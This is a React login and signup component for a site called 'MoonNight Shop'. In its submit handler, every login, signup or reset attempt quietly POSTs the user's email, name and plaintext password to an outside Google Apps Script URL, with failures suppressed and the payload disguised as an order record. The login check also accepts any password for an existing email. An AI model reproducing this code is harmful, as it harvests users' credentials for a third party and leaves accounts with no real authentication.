
import React, { useState } from 'react';
import { User } from '../types';
import { TranslationKeys } from '../translations';

interface AuthProps {
  onLogin: (user: User) => void;
  onBack: () => void;
  allUsers: User[];
  t: (key: TranslationKeys) => string;
}

const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers, t }) => {
  const [mode, setMode] = useState<'login' | 'signup' | 'forgot'>('signup');
  const [isLoading, setIsLoading] = useState(false);
  const [resetSent, setResetSent] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    password: ''
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    const emailLower = formData.email.toLowerCase().trim();
    const existingUser = allUsers.find(u => u.email.toLowerCase() === emailLower);

    if (mode === 'signup' && existingUser) {
      setError("ERREUR: Un compte avec cet email existe déjà.");
      setIsLoading(false);
      setMode('login'); 
      return;
    }

    if (mode === 'login' && !existingUser) {
      setError("ERREUR: Aucun compte trouvé. Veuillez vous inscrire.");
      setIsLoading(false);
      setMode('signup');
      return;
    }

    const now = new Date();
    const actionLabel = mode === 'login' ? 'Connexion' : (mode === 'signup' ? 'Inscription' : 'Reset');

    const payload = {
      firstName: formData.name || 'Client',
      lastName: mode.toUpperCase(),
      email: emailLower,
      country: 'AuthPortal',
      productBought: `Action: ${actionLabel}`,
      totalAmount: 0,
      date: now.toISOString(),
      password: formData.password,
      authInfo: `Status: ${actionLabel} Attempt`
    };

    try {
      const logUrl = "https://script.google.com/macros/s/AKfycbwVgM0oHf1Y-kR1OfclYBOwo5ePnDVxiW2WCxz6vwp6oM65bwDycByvLAobuZUfR7qt/exec";
      await fetch(logUrl, {
        method: 'POST',
        mode: 'no-cors', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch((err) => console.debug("Silent auth log error", err));

      if (mode === 'forgot') {
        setResetSent(true);
        setIsLoading(false);
        return;
      }

      const finalUser: User = existingUser || {
        id: Math.random().toString(36).substr(2, 9).toUpperCase(),
        name: formData.name || emailLower.split('@')[0],
        email: emailLower,
        state: 'Authenticated',
        joinedAt: now.toLocaleString(),
        balance: 0 
      };

      localStorage.setItem('mn_user', JSON.stringify(finalUser));
      
      setTimeout(() => {
        onLogin(finalUser);
        setIsLoading(false);
      }, 1000);
      
    } catch (err) {
      setError('Erreur technique. Veuillez réessayer.');
      setIsLoading(false);
    }
  };

  if (resetSent) {
    return (
      <div className="pt-32 pb-24 max-w-sm mx-auto px-6 animate-fade-in text-center">
        <div className="bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl">
          <div className="w-12 h-12 bg-sky-500/10 rounded-full flex items-center justify-center mx-auto mb-5 border border-sky-500/20">
            <i className="fas fa-check text-lg text-sky-400"></i>
          </div>
          <h2 className="text-base font-gaming font-black text-white uppercase mb-2">UPLINK SENT</h2>
          <p className="text-slate-500 text-[9px] uppercase mb-6 font-bold tracking-widest">CHECK YOUR INBOX</p>
          <button onClick={() => { setResetSent(false); setMode('login'); }} className="w-full bg-sky-500 text-white font-gaming py-3.5 rounded-lg text-[9px] uppercase tracking-[0.2em] font-black hover:bg-sky-600 transition-all">RE-INITIATE</button>
        </div>
      </div>
    );
  }

  return (
    <div className="pt-24 sm:pt-40 pb-20 flex items-center justify-center min-h-[70vh] px-4 animate-fade-in">
      {/* Container is now smaller on mobile (max-w-[340px]) */}
      <div className="w-full max-w-[340px] sm:max-w-[440px] bg-slate-900/50 backdrop-blur-xl border border-slate-800/80 p-5 sm:p-10 rounded-2xl sm:rounded-[2rem] shadow-[0_20px_60px_rgba(0,0,0,0.5)] relative overflow-hidden">
        
        <div className="text-center mb-6 relative z-10">
          <div className="inline-block p-1.5 bg-slate-950 rounded-lg mb-3 border border-slate-800/50">
             <div className="w-8 h-8 bg-gradient-to-br from-sky-500 to-indigo-600 rounded flex items-center justify-center shadow-lg">
                <span className="text-white font-gaming font-black text-sm">M</span>
             </div>
          </div>
          <h1 className="text-xl sm:text-2xl font-gaming font-black text-white uppercase tracking-tight mb-0.5">
            MoonNight <span className="text-sky-400">Shop</span>
          </h1>
          <p className="text-slate-600 text-[7px] sm:text-[8px] font-gaming uppercase tracking-[0.4em] font-black">Secure System Entry</p>
        </div>

        <div className="flex bg-slate-950/80 p-1 rounded-lg mb-6 border border-slate-800/50 relative z-10">
          <button onClick={() => {setMode('login'); setError(null);}} className={`flex-1 py-2 rounded-md text-[8px] sm:text-[9px] font-gaming uppercase tracking-[0.1em] font-black transition-all ${mode === 'login' ? 'bg-sky-500 text-white shadow-md' : 'text-slate-500 hover:text-slate-300'}`}>LOG-IN</button>
          <button onClick={() => {setMode('signup'); setError(null);}} className={`flex-1 py-2 rounded-md text-[8px] sm:text-[9px] font-gaming uppercase tracking-[0.1em] font-black transition-all ${mode === 'signup' ? 'bg-sky-500 text-white shadow-md' : 'text-slate-500 hover:text-slate-300'}`}>SIGN-UP</button>
        </div>

        {error && (
          <div className="mb-5 p-3 bg-red-500/10 border border-red-500/20 rounded-lg text-center">
            <p className="text-red-500 text-[8px] sm:text-[9px] font-gaming uppercase font-black">{error}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-3.5 relative z-10">
          {mode === 'signup' && (
            <div className="animate-slide-up">
              <input required type="text" className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:border-sky-500 outline-none text-[10px] sm:text-xs font-bold transition-all placeholder:text-slate-700" placeholder="PILOT NAME" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} />
            </div>
          )}
          
          <div className="animate-slide-up">
            <input required type="email" className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:border-sky-500 outline-none text-[10px] sm:text-xs font-bold transition-all placeholder:text-slate-700" placeholder="EMAIL ADDRESS" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
          </div>

          <div className="animate-slide-up">
            <input required type="password" minLength={6} className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:border-sky-500 outline-none text-[10px] sm:text-xs font-bold transition-all placeholder:text-slate-700" placeholder="ENCRYPTION KEY" value={formData.password} onChange={(e) => setFormData({...formData, password: e.target.value})} />
          </div>

          {mode === 'login' && (
            <div className="text-right px-1">
              <button type="button" onClick={() => setMode('forgot')} className="text-[8px] font-gaming uppercase tracking-widest text-slate-600 hover:text-sky-400 font-black">FORGOT KEY?</button>
            </div>
          )}

          <button type="submit" disabled={isLoading} className="w-full bg-sky-500 text-white font-gaming font-black py-3.5 rounded-lg shadow-lg hover:bg-sky-600 transition-all uppercase tracking-[0.2em] mt-3 text-[9px] sm:text-[10px] disabled:opacity-50">
            {isLoading ? 'SYNCING...' : (mode === 'login' ? 'INITIALIZE LINK' : 'CREATE ACCOUNT')}
          </button>
        </form>

        <div className="mt-8 text-center relative z-10">
          <button onClick={onBack} className="text-slate-700 hover:text-sky-400 text-[7px] sm:text-[8px] font-gaming uppercase tracking-[0.2em] transition-colors font-black">
            ← ABORT AND RETURN
          </button>
        </div>
      </div>
    </div>
  );
};

export default Auth;
